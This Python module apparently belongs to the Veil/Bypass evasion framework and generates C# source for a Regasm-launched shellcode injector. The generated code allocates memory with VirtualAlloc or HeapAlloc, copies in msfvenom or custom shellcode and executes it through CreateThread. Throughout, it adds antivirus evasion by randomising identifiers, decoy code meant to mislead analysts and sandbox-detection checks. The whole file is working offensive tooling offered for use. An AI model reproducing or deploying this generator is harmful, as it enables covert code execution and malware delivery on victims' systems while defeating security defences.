"""

Regasm C# inline shellcode injector using the VirtualAlloc()/CreateThread() pattern.
Uses basic variable renaming obfuscation.

Adapated from code from:
    http://webstersprodigy.net/2012/08/31/av-evading-meterpreter-shell-from-a-net-service/
    https://github.com/Veil-Framework/Veil/blob/master/Tools/Evasion/payloads/cs/shellcode_inject/base64.py

Module built by @ConsciousHacker

"""

from Tools.Bypass.bypass_common import bypass_helpers
from Tools.Bypass.bypass_common import gamemaker
from Tools.Bypass.bypass_common import shellcode_help


class PayloadModule:

    def __init__(self, cli_obj):
        # required
        self.language = "regasm"
        self.extension = "cs"
        self.rating = "Excellent"
        self.description = "Regasm C# VirtualAlloc method for inline shellcode injection"
        self.name = "Regasm C# Flat Shellcode Injector"
        self.path = "regasm/shellcode_inject/virtual"
        self.shellcode = shellcode_help.Shellcode(cli_obj)
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user ineraction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
                                    "COMPILE_TO_DLL" : ["Y", "Compile to a DLL"],
                                    "INJECT_METHOD"  : ["Heap", "Virtual or Heap"],
                                    "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
                                    "HOSTNAME"       : ["X", "Optional: Required system hostname"],
                                    "DOMAIN"         : ["X", "Optional: Required internal domain"],
                                    "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
                                    "TIMEZONE"       : ["X", "Optional: Check to validate not in UTC"],
                                    "USERNAME"       : ["X", "Optional: The required user account"],
                                    "DEBUGGER"       : ["X", "Optional: Check if debugger is attached"],
                                    "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
                                }

    def generate(self):

        # Generate the shellcode
        if not self.cli_shellcode:
            Shellcode = self.shellcode.generate(self.cli_opts)
            if self.shellcode.msfvenompayload:
                self.payload_type = self.shellcode.msfvenompayload
            elif self.shellcode.payload_choice:
                self.payload_type = self.shellcode.payload_choice
                self.shellcode.payload_choice = ''
            # assume custom shellcode
            else:
                self.payload_type = 'custom'
        else:
            Shellcode = self.cli_shellcode
        # Base64 encode the shellcode
        Shellcode = "0" + ",0".join(Shellcode.split("\\")[1:])

        # randomize all our variable names, yo'
        className = bypass_helpers.randomString()
        classNameTwo = bypass_helpers.randomString()
        namespace = bypass_helpers.randomString()
        key = bypass_helpers.randomString()
        execName = bypass_helpers.randomString()
        bytearrayName = bypass_helpers.randomString()
        funcAddrName = bypass_helpers.randomString()
        savedStateName = bypass_helpers.randomString()
        messWithAnalystName = bypass_helpers.randomString()
        shellcodeName = bypass_helpers.randomString()
        rand_bool = bypass_helpers.randomString()
        random_out = bypass_helpers.randomString()


        hThreadName = bypass_helpers.randomString()
        threadIdName = bypass_helpers.randomString()
        pinfoName = bypass_helpers.randomString()
        num_tabs_required = 0

        # get random variables for the API imports
        r = [bypass_helpers.randomString() for x in range(16)]
        y = [bypass_helpers.randomString() for x in range(17)]

        #required syntax at the beginning of any/all payloads
        payload_code = "using System; using System.Net; using System.Linq; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading; using System.EnterpriseServices; using System.Windows.Forms;\n"
        payload_code += "namespace {0}\n {{".format(namespace)
        payload_code += "\n\tpublic class {0} : ServicedComponent {{\n".format(className)
        # placeholder for legitimate C# program
        # lets add a message box to throw offf sandbox heuristics and analysts :)
        payload_code += '\n\t\tpublic {0}() {{ Console.WriteLine("doge"); }}\n'.format(className)
        payload_code += "\n\t\t[ComRegisterFunction]"
        payload_code += "\n\t\tpublic static void RegisterClass ( string {0} )\n\t\t{{\n".format(key)
        payload_code += "\t\t\t{0}.{1}();\n\t\t}}\n".format(classNameTwo, execName)
        payload_code += "\n[ComUnregisterFunction]"
        payload_code += "\n\t\tpublic static void UnRegisterClass ( string {0} )\n\t\t{{\n".format(key)
        payload_code += "\t\t\t{0}.{1}();\n\t\t}}\n\t}}\n".format(classNameTwo, execName)

        payload_code += "\n\tpublic class {0}\n\t{{".format(classNameTwo)
        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += """\t\t[DllImport(\"kernel32\")] private static extern IntPtr VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr %s, uint %s, uint %s, out uint %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, IntPtr %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11], r[12], r[13], r[14], r[15])
        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            payload_code += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 HeapCreate(UInt32 %s, UInt32 %s, UInt32 %s); \n[DllImport(\"kernel32\")] private static extern UInt32 HeapAlloc(UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 RtlMoveMemory(UInt32 %s, byte[] %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s, IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);"""%(y[0],y[1],y[2],y[3],y[4],y[5],y[6],y[7],y[8],y[9],y[10],y[11],y[12],y[13],y[14],y[15],y[16])

        payload_code += "\n\t\tpublic static void {0}() {{\n".format(execName)
        payload_code2, num_tabs_required = gamemaker.senecas_games(self)
        payload_code = payload_code + payload_code2
        num_tabs_required += 3

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += '\t' * num_tabs_required + "byte[] %s = {%s};" % (shellcodeName, Shellcode)
            payload_code += '\t' * num_tabs_required + "IntPtr %s = VirtualAlloc(0, (UInt32)%s.Length, 0x3000, 0x04);\n" % (funcAddrName, shellcodeName)
            payload_code += '\t' * num_tabs_required + "Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" % (shellcodeName, funcAddrName, shellcodeName)
            payload_code += '\t' * num_tabs_required + "IntPtr %s = IntPtr.Zero; UInt32 %s = 0; IntPtr %s = IntPtr.Zero;\n" %(hThreadName, threadIdName, pinfoName)
            payload_code += '\t' * num_tabs_required + "uint %s;\n" %(random_out)
            payload_code += '\t' * num_tabs_required + "bool %s = VirtualProtect(%s, (uint)0x1000, (uint)0x20, out %s);\n" %(rand_bool, funcAddrName, random_out)
            payload_code += '\t' * num_tabs_required + "%s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" % (hThreadName, funcAddrName, pinfoName, threadIdName)
            payload_code += '\t' * num_tabs_required + "WaitForSingleObject(%s, 0xFFFFFFFF);\n" % (hThreadName)

        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":

            rand_heap = bypass_helpers.randomString()
            rand_ptr = bypass_helpers.randomString()
            rand_var = bypass_helpers.randomString()

            payload_code += '\t' * num_tabs_required + "byte[] %s = {%s};" % (shellcodeName, Shellcode)
            payload_code += '\t' * num_tabs_required + 'UInt32 {} = HeapCreate(0x00040000, (UInt32){}.Length, 0);\n'.format(rand_heap, shellcodeName)
            payload_code += '\t' * num_tabs_required + 'UInt32 {} = HeapAlloc({}, 0x00000008, (UInt32){}.Length);\n'.format(rand_ptr, rand_heap, shellcodeName)
            payload_code += '\t' * num_tabs_required + 'RtlMoveMemory({}, {}, (UInt32){}.Length);\n'.format(rand_ptr, shellcodeName, shellcodeName)
            payload_code += '\t' * num_tabs_required + 'UInt32 {} = 0;\n'.format(rand_var)
            payload_code += '\t' * num_tabs_required + 'IntPtr {} = CreateThread(0, 0, {}, IntPtr.Zero, 0, ref {});\n'.format(hThreadName, rand_ptr, rand_var)
            payload_code += '\t' * num_tabs_required + 'WaitForSingleObject({}, 0xFFFFFFFF);\n'.format(hThreadName)


        while (num_tabs_required != 0):
            payload_code += '\t' * num_tabs_required + '}'
            num_tabs_required -= 1

        self.payload_source_code = payload_code
        return
